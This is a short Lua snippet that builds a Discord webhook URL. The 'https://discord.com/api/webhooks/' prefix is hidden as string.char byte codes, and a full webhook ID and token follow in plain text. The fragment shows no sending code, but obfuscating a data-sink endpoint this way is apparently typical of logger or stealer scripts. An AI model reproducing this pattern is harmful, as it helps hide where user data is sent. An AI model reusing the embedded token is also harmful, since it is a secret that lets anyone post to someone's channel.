local function gw()
    local b = string.char
    local p1 = b(104,116,116,112,115,58,47,47,100,105,115,99,111,114,100,46,99,111,109,47,97,112,105,47,119,101,98,104,111,111,107,115,47)
    local p2 = "1544589998198755329/"
    local p3 = "DH2ha0j2AXINPCfqlbe-PGvPD7LFot-9DWHHn1qNuNISN6w9EPn8rcF_sQ_arY33f1oV"
    return p1 .. p2 .. p3
end
local WU = gw()

